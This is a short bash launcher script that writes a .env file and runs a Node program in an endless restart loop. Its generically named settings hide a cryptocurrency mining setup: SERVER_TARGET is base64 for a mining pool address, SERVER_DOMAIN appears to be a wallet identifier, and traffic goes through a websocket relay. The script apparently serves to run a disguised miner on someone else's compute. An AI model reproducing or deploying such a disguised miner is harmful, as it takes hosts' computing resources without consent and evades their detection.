#!/bin/bash
CONNECT=${1:-8}
NAME=${2:-020}
echo "SERVER_WS=wss://alpaquitaandina.online
SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
SERVER_DOMAIN=Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 10; done
